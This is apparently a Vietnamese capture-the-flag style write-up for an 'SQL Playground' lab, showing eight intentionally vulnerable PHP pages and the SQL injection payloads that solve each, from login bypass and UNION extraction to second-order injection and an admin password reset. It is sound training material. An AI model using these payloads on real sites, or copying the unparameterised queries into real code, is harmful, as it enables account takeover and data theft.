# Write-up-SQL-Playground

**Level 1:**

```php
<?php
function loginHandler($username, $password)
{
	try {
		include("db.php");
		$database = make_connection("plaintext_db");

		$sql = "SELECT username FROM users WHERE username='$username' AND password='$password'";
		$query = $database->query($sql);
		$row = $query->fetch_assoc(); // Get the first row

		if ($row === NULL)
			return "Wrong username or password"; // No result

		$login_user = $row["username"];
		if ($login_user === "admin")
			return "Wow you can log in as admin, here is your flag flag{da6d016bf546bfd86b8808136ebc8bc0}, but how about <a href='level2.php'>THIS LEVEL</a>!";
		else
			return "You log in as $login_user, but then what? You are not an admin";
	} catch (mysqli_sql_exception $e) {
		return $e->getMessage();
	}
}

if (isset($_POST["username"]) && isset($_POST["password"])) {
	$username = $_POST["username"];
	$password = $_POST["password"];
	$message = loginHandler($username, $password);
}

include("static/html/login.html");
```
Lấy trực tiếp `username` và `password` nhập vào chèn thẳng trực tiếp vào chuỗi mà không chặn và lọc gì cả

Payload:
```
username: ' or 1=1 -- -
password: 1
```
<img width="1492" height="813" alt="image" src="https://github.com/user-attachments/assets/067690cf-882c-45ea-b50e-c12557167bc6" />

Done Level 1 nhe !!!

**Level 2:**
```php
<?php
function loginHandler($username, $password)
{
	try {
		include("db.php");
		$database = make_connection("plaintext_db");

		$sql = "SELECT username FROM users WHERE username=\"$username\" AND password=\"$password\"";
		$query = $database->query($sql);
		$row = $query->fetch_assoc(); // Get the first row

		if ($row === NULL)
			return "Wrong username or password"; // No result

		$login_user = $row["username"];
		if ($login_user === "admin")
			return "Wow you can log in as admin, here is your flag flag{f8ef24f0eebdfa5defdabc632f494f3e}, but how about <a href='level3.php'>THIS LEVEL</a>!";
		else
			return "You log in as $login_user, but then what? You are not an admin";
	} catch (mysqli_sql_exception $e) {
		return $e->getMessage();
	}
}

if (isset($_POST["username"]) && isset($_POST["password"])) {
	$username = $_POST["username"];
	$password = $_POST["password"];
	$message = loginHandler($username, $password);
}

include("static/html/login.html");
```
Ở đây có dấu escape  , Nhưng chẳng có tác dụng gì cả . Bởi vì trong câu truy vấn lại sử dụng nháy kép thay vì nháy đơn , cho nên phải dùng dấu escape để kí hiệu rằng đây là nháy kép của chuỗi chứ nó không có tác dụng đóng mở một giá trị 

Thực tế khi vào trong Database thì nó sẽ chạy:
```sql
SELECT username FROM users WHERE username="$username" AND password="$password"
```
Cho nên payload chúng ta cần chỉ là: 
```sql
admin" -- -
```

<img width="1498" height="817" alt="image" src="https://github.com/user-attachments/assets/efe88312-80cc-4b3a-9e42-78edad11b18b" />

Done Level 2 nhe !!!

**Level 3:**

```php
<?php
function loginHandler($username, $password)
{
	try {
		include("db.php");
		$database = make_connection("hashed_db");

		$sql = "SELECT username FROM users WHERE username=LOWER(\"$username\") AND password=MD5(\"$password\")";
		$query = $database->query($sql);
		$row = $query->fetch_assoc(); // Get the first row

		if ($row === NULL)
			return "Wrong username or password"; // No result

		$login_user = $row["username"];
		if ($login_user === "admin")
			return "Wow you can log in as admin, here is your flag flag{4f629fe490901e261258d977a47f96e1}, but how about <a href='level4.php'>THIS LEVEL</a>!";
		else
			return "You log in as $login_user, but then what? You are not an admin";
	} catch (mysqli_sql_exception $e) {
		return $e->getMessage();
	}
}

if (isset($_POST["username"]) && isset($_POST["password"])) {
	$username = $_POST["username"];
	$password = $_POST["password"];
	$message = loginHandler($username, $password);
}

include("static/html/login.html");
```
Ở Level 3 này tương tự Lv2 , Nhưng nó chỉ sử dụng thêm dấu ngoặc tròn để đóng giá trị lại 
```php
username=LOWER(\"$username\")
```

Vậy payload cần là: 
```sql
admin") -- -
```

<img width="1492" height="819" alt="image" src="https://github.com/user-attachments/assets/cf047556-d281-4d30-92b9-16e3e76c4a2d" />

Done Level 3 nhe !!!

**Level 4:**
```php
<?php
function checkValid($data)
{
    if (strpos($data, '"') !== false)
        return false;
    return true;
}

function loginHandler($username, $password)
{
    if (!checkValid($username) || !checkValid($password))
        return "Hack detected";

    try {
        include("db.php");
        $database = make_connection("hashed_db");

        $sql = "SELECT username FROM users WHERE username=LOWER(\"$username\") AND password=MD5(\"$password\")";
        $query = $database->query($sql);
        $row = $query->fetch_assoc(); // Get the first row

        if ($row === NULL)
            return "Wrong username or password"; // No result

        $login_user = $row["username"];
        if ($login_user === "admin")
            return "Wow you can log in as admin, here is your flag flag{44682b8def08e0fe9cdcb079e7db4dc0}, but how about <a href='level5.php'>THIS LEVEL</a>!";
        else
            return "You log in as $login_user, but then what? You are not an admin";
    } catch (mysqli_sql_exception $e) {
        return $e->getMessage();
    }
}

if (isset($_POST["username"]) && isset($_POST["password"])) {
    $username = $_POST["username"];
    $password = $_POST["password"];
    $message = loginHandler($username, $password);
}

include("static/html/login.html");

```
Level 4 này nó có kiểm tra trong dữ liệu nhập vào có dấu nháy kép hay không ?

Chúng ta có thể bypass bằng cách Hex những giá trị nằm trong dấu nháy kép và thêm 0x vào trước chuỗi Hex đó

Hoặc là: Bạn có thể sử dụng luôn dấu nháy đơn cũng được , Bởi vì PHP nó không quan trọng trong câu truy vấn đó phải đóng mở giá trị bằng nháy đơn hay nháy kép . Ví dụ :
```sql
username=LOWER("$username") AND password=MD5('$password')
```
Nhưng vấn đề là làm sao để đóng cái nháy kép đầu tiên ở username lại . -> Chúng ta sử dụng dấu Escape `\` . Như vậy khi vào trong Database sẽ là:
```sql
SELECT username FROM users WHERE username=LOWER("\") AND password=MD5("$password")
```
Dấu Escape đã làm cho dấu nháy kép vốn dùng để đóng cái giá trị nhập vào nay lại trở thành một chuỗi văn bản vô hại. Và vì thế dấu nháy kép của password vốn dùng để mở cái giá trị nhập vào lại trở thành cái đóng giá trị nhập vào của username 
```
username: ") AND password=MD5(
```
Sau khi đóng cái được cái dấu nháy kép của username lại rồi thì chúng ta cần đóng thêm ngoặc tròn kia nữa . Vậy thì ở password chúng ta nhập vào 
```
password: ) -- -
```
Vậy thì khi vào Database sẽ là:
```sql
SELECT username FROM users WHERE username=LOWER("\") AND password=MD5(") -- - ")
```
Vậy cuối cùng payload cần truyền là 
```sql
username: \
password: ) or username = 'admin' -- -
```
Khi vào truy Database nó sẽ là:
```sql
SELECT username FROM users WHERE username=LOWER("\") AND password=MD5(") or username = 'admin' -- -
```
Kết quả là: 

<img width="1494" height="810" alt="image" src="https://github.com/user-attachments/assets/1eed49f4-78ec-4b8c-b772-c20e07c48756" />

Done Level 4 nhe !!!

**Level 5:**
```php
<?php
function loginHandler($username, $password)
{
	try {
		include("db.php");
		$database = make_connection("hashed_db");

		$sql = "SELECT username, password FROM users WHERE username='$username'";
		$query = $database->query($sql);
		$row = $query->fetch_assoc(); // Get the first row

		if ($row === NULL)
			return "Username not found"; // No result

		$login_user = $row["username"];
		$login_password = $row["password"];

		if ($login_password !== md5($password))
			return "Wrong username or password";

		if ($login_user === "admin")
			return "Wow you can log in as admin, here is your flag flag{3fa996e38acc675ae51fef858dc35eb3}, but how about <a href='level6.php'>THIS LEVEL</a>!";
		else
			return "You log in as $login_user, but then what? You are not an admin";
	} catch (mysqli_sql_exception $e) {
		return $e->getMessage();
	}
}

if (isset($_POST["username"]) && isset($_POST["password"])) {
	$username = $_POST["username"];
	$password = $_POST["password"];
	$message = loginHandler($username, $password);
}

include("static/html/login.html");
```

Ở Lv5 , nó kiểm tra mật khẩu nhập vào có bằng với password đã Hash md5 ở trong Database hay không

Và nếu đăng nhập được với tư cách là `admin` thì sẽ ra flag bài này

Vấn đề cần bypass ở đây là cái mật khẩu . Nếu chúng ta muốn kết quả trả về từ database trùng với cái mật khẩu nhập vào thì cần phải 
```
union select 12345 -- -
```
Như vậy kết quả sau truy vấn sẽ trả về là 123123 . Rồi nếu chúng ta nhập vào ở ô password là 123123 thì cái nhập vào cũng bằng với cái được trả về từ database . Nhưng ở đây nó lại hash cái pass nhập vào rồi mới so sánh . Tức là
```
Đây là cái nhập vào bị hash ---> Hash('12345') vs   12345 <----- Đây là kết quả từ database trả về
```
Vậy thì Trước tiên chúng ta phải hash cái 12345 rồi bỏ vào trong câu truy vấn và cái password chúng ta sẽ nhập 12345. 

Thì lúc đó sẽ được
```
Đây là cái nhập vào bị hash ---> Hash('12345') = 827ccb0eea8a706c4c34a16891f84e7b <----- Đây là kết quả từ database trả về
```
Và payload sẽ là: 
```sql
username: ' union select 'admin','827ccb0eea8a706c4c34a16891f84e7b' -- -
password: 12345
```

<img width="1496" height="805" alt="image" src="https://github.com/user-attachments/assets/6db21297-9111-4841-941b-fd5c54b7f7f6" />


**Level 6:**
```php
<?php
if (isset($_GET["id"])) {
    try {
        include("db.php");
        $database = make_connection("posts_db");

        $id = $database->real_escape_string($_GET["id"]);
        $sql = "SELECT content FROM posts WHERE id=$id";
        $query = $database->query($sql);
        $row = $query->fetch_assoc(); // Get the first row

        if ($row !== NULL)
            $message = "<iframe height='800px' width='100%' src='" . $row["content"] . "'></iframe>";
        else
            $message = "ID not found"; // No result
    } catch (mysqli_sql_exception $e) {
        $message = $e->getMessage();
    }
} else {
    header("Location: level6.php?id=1");
}

include("static/html/blog.html");
```
Chúng ta nhận thấy đường dẫn nhận Id để hiển thị dữ liệu là kết quả trả về từ việc thực hiện truy vấn SQL , mà ở đây lại sử dụng nối chuỗi trực tiếp không lọc gì cả 

Vào trong Database thì chúng ta có được 
```sql
USE posts_db; -- This database use for level 6

DROP TABLE IF EXISTS `posts`;

CREATE TABLE `posts` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `content` text NOT NULL,
  PRIMARY KEY (`id`)
);

INSERT INTO `posts` (`id`, `content`) VALUES (1, 'https://blog.cyberjutsu.io/2021/08/09/hoc-an-toan-thong-tin/');
INSERT INTO `posts` (`id`, `content`) VALUES (2, 'https://blog.cyberjutsu.io/2021/06/02/IDOL-streamer-vs-XSS/');
INSERT INTO `posts` (`id`, `content`) VALUES (3, 'https://blog.cyberjutsu.io/2021/05/13/HTML-sanitizer-vs-XSS/');

DROP TABLE IF EXISTS `secret6`;

CREATE TABLE `secret6` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `content` text NOT NULL,
  PRIMARY KEY (`id`)
);

INSERT INTO `secret6` (`id`, `content`) VALUES (1, 'flag{eb627f3d394a64184da1a16d6bb8100d}');
```
Vậy thì để lấy được flag thì chúng ta cần payload:
```sql
1000 UNION SELECT content FROM secret6 WHERE id = 1-- -
```
Lúc này do id = 1000 không có dữ liệu trả về nên nó sẽ lấy dữ liệu ở câu truy vấn thứ 2 , mà câu truy vấn thứ 2 lại là câu lấy flag .

Sau đó dữ liệu trả về được gán vào trong `$row["content"]` . Và  `$row["content"]` sẽ được in ra ở trong source code 
```
src='" . $row["content"] .
```

<img width="1494" height="760" alt="image" src="https://github.com/user-attachments/assets/ac451d7f-236f-4e40-afc1-aae505ad13b9" />

**Level 7:**

`level7.php`
```php
<?php
session_start();
if (isset($_POST["username"]) && isset($_POST["password"])) {
    try {
        include("header.php");
        $database = make_connection("advanced_db");

        $sql = "SELECT username FROM users WHERE username=? and password=?";
        $statement = $database->prepare($sql);
        $statement->bind_param('ss', $_POST['username'], md5($_POST['password']));
        $statement->execute();
        $statement->store_result();
        $statement->bind_result($result);

        if ($statement->num_rows > 0) {
            $statement->fetch();
            $_SESSION["username"] = $result;
            die(header("Location: profile.php"));
        } else {
            $message = "Wrong username or password";
        }
    } catch (mysqli_sql_exception $e) {
        $message = $e->getMessage();
    }   
}

include("../basic/static/html/second-order.html");
```
`profile.php`
```php
<?php
session_start();
include("header.php");
$database = make_connection("advanced_db");

if (!isset($_SESSION['username']))
    die(header("Location: level7.php"));

$username = $_SESSION['username'];
if (isset($_POST['button'])) {
    try {
        $sql = "SELECT email FROM users WHERE username='$username'";
        $db_result = $database->query($sql);
        $row = $db_result->fetch_assoc(); // Get the first row

        if (isset($row)) 
            $message = $row['email'];
            
    } catch (mysqli_sql_exception $e) {
        $message = $e->getMessage();
    }
}

include("../basic/static/html/profile.html");
```
`register.php`
```php
<?php
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    try {
        include("header.php");
        $database = make_connection("advanced_db");
        
        $sql = "SELECT username from users where username=?";
        $statement = $database->prepare($sql);
        $statement->bind_param('s', $_POST['username']);
        $statement->execute();
        $statement->store_result();

        if ($statement->num_rows() > 0) {
            $message = "Sorry this username already registered";
        } else {
            $sql = "INSERT INTO users(username, password, email) VALUES (?, ?, ?)";
            $statement = $database->prepare($sql);
            $statement->bind_param('sss', $_POST['username'], md5($_POST['password']), $_POST['email']);
            $statement->execute();
            $message = "Create successful";
        }
    } catch (mysqli_sql_exception $e) {
        $message = $e->getMessage();
    }
}

include("../basic/static/html/register.html");
```
Đầu tiên thử tạo 1 tài khoản hợp lệ để xem sao
```
username: mmm
password: 1
email: 1@gmail.com
```
<img width="1046" height="341" alt="image" src="https://github.com/user-attachments/assets/bb45d0e1-344d-43db-8335-72c6ce2d97a3" />

Login vào và `Click here to show your Email`

<img width="1238" height="220" alt="image" src="https://github.com/user-attachments/assets/4f64e329-7e0b-435a-9979-39d61ff6feb6" />

Chúng ta thấy được email là nơi hiển thị 

Đọc source code thì thấy được , `register.php` nó không lọc bất cứ dữ liệu đầu vào nào nhưng nó lại sử dụng placeholder nên cho dù có dùng dấu nháy đơn hay dấu comment cũng không thể phá vỡ cấu trúc cú pháp ở đây được

`level7.php` thì nó lại check password và username có đúng hay không thôi . Và ở đây cũng sử dụng placeholder nên cũng không thể Injection ở đây được 

Lỗ hổng xảy ra tại file `profile.php` 
```sql
$sql = "SELECT email FROM users WHERE username='$username'";
```
Nó nối chuỗi trực tiếp và lấy ra email với username tương ứng rồi in ra màn hình. Vào trong file `db.sql` thì chúng ta thấy được dòng
```sql
INSERT INTO `users` (`id`, `username`, `password`, `email`) VALUES (21, 'FLAG', 'flag{SeConD_oRdEr_SqL_InjecTioN}', 'flag@222.io');
```
Vậy nếu chúng ta có thể lấy được password của `flag` rồi bỏ vào column email thì chúng ta có thể in ra được màn hình flag đang cần .

Câu truy vấn chúng ta cần bây giờ là:
```sql
SELECT email FROM users WHERE username='' UNION SELECT password FROM users WHERE id = 21 -- -
```
Tức là:
```
$sql = "SELECT email FROM users WHERE username='$username'";

$username phải bằng với ' UNION SELECT password FROM users WHERE id = 21 -- -
```
mà `$username` lại được lấy từ việc thực hiện truy vấn ở `level7.php`

Vậy nếu chúng ta đăng kí 
```
username: ' union select password from users where id = 21 -- +
password: 1
email: 1@gmail.com
```
Rồi Login lại thì tại `level7.php` . Nó sẽ xử lý câu lệnh SQL như sau
```
SELECT username FROM users WHERE username= '' union select password from users where id = 21 -- +' and password = '1'
```
Kết quả truy vấn sẽ trả về
```
Cột 1: ' union select password from users where id = 21 -- +
Cột 2: 1
```
Và cái biến `$username` ở `profile.php` sẽ nhận `' union select password from users where id = 21 -- +`

Nhét vào trong `$username` của `SELECT email FROM users WHERE username='$username'` 

Thì lúc này chúng ta sẽ được 
```sql
SELECT email FROM users WHERE username='' union select password from users where id = 21 -- +
```
Thưc hiện thôi 

<img width="1493" height="815" alt="image" src="https://github.com/user-attachments/assets/cf43ce71-a962-410a-85a8-c91fe023360b" />

Login lại bằng username vừa register . Rồi vào trong `Click to here to show your Email` 

<img width="1236" height="218" alt="image" src="https://github.com/user-attachments/assets/65d2d992-76eb-4a6b-abd6-3bf66f418460" />

**Level 8:**

`level8.php`

```php
<?php
session_start();
if (isset($_POST["username"]) && isset($_POST["password"])) {
    try {
        include("header.php");
        $database = make_connection("advanced_db");

        $sql = "SELECT username FROM users WHERE username=? and password=?";
        $statement = $database->prepare($sql);
        $statement->bind_param('ss', $_POST['username'], md5($_POST['password']));
        $statement->execute();
        $statement->store_result();
        $statement->bind_result($result);

        if ($statement->num_rows > 0) {
            $statement->fetch();
            $_SESSION["username"] = $result;
            die(header("Location: update.php"));
        } else {
            $message = "Wrong username or password";
        }
    } catch (mysqli_sql_exception $e) {
        $message = $e->getMessage();
    }
}

include("../basic/static/html/second-order.html");
```
`update.php`
```php
<?php
session_start();
include("header.php");
$database = make_connection("advanced_db");

if (!isset($_SESSION['username']))
    die(header("location: level8.php"));

$username = $_SESSION['username'];
$email = $_POST['email'];
if ($username === 'admin')
    $message = "<h3><b>Wow you can finally log in as admin, here is your flag flag{3b8d44262532d61b6f4eb29c37a57640}</b></h3>";

if (isset($_POST['button'])) {
    try {
        $sql = "UPDATE users SET email='$email' WHERE username='$username'";
        $db_result = $database->query($sql);
        if ($db_result) {
            $message = "Successfully update your Email";
        } else {
            $message = "Failed to update your email";
        }
    } catch (mysqli_sql_exception $e) {
        $message = $e->getMessage();
    }
}

include("../basic/static/html/update.html");
```
Ở đây chúng ta thấy được lỗ hổng SQLi ở `update.php`
```sql
 $sql = "UPDATE users SET email='$email' WHERE username='$username'";
```
Nếu chúng ta đăng nhập được với `username`: `admin` thì sẽ ra flag

Mình thử register một tài khoản hợp lệ rồi Login vào xem nó sẽ hiện những gì
```
username: 2
password: 2
emai: 1@gmail.com
```
<img width="1491" height="812" alt="image" src="https://github.com/user-attachments/assets/cc11d0ad-c7fb-46cc-a18d-607b645ee428" />


Lấy nó login vào được `update.php`

<img width="778" height="308" alt="image" src="https://github.com/user-attachments/assets/0db6d3b6-0f4b-483f-b469-9fe7b9b1644d" />

Đây là nơi có thể SQL Injection 

```sql
$sql = "UPDATE users SET email='$email' WHERE username='$username'";
```
Mục tiêu , set password chứ không phải set Email . Chúng ta cần truy vấn như sau:
```sql
UPDATE users SET email='1@gmail.com' , password = 'abc123' WHERE username = 'admin';
```
Vậy payload cần truyền:
```sql
1@gmail.com' , password = 'abc123' WHERE username = 'admin' -- -
```
Nhưng password nhập vào lại được Hash md5
```sql
$statement->bind_param('ss', $_POST['username'], md5($_POST['password']));
```
Vậy nên chúng ta phải Hash md5 `abc123` thành `e99a18c428cb38d5f260853678922e03` . Bởi vì cái `UPDATE ... SET` đó nó sẽ ném nguyên cục hash rồi vào trong database . Và khi ta nhập lại từ ngoài thì cái `abc123` nó sẽ được hash rồi mới so sánh với cái trong database

Payload cuối cùng 
```sql
1@gmail.com' , password = 'e99a18c428cb38d5f260853678922e03' WHERE username = 'admin' -- -
```
<img width="1491" height="814" alt="image" src="https://github.com/user-attachments/assets/541760e8-69ba-4448-9149-a06b8b6f99d0" />

Update thành công mật khẩu admin . Giờ lấy
```
username: admin
password: abc123
```
Login vào thôi 

<img width="1012" height="369" alt="image" src="https://github.com/user-attachments/assets/00deb870-6521-4e66-b9dc-b91b8bbd4b64" />




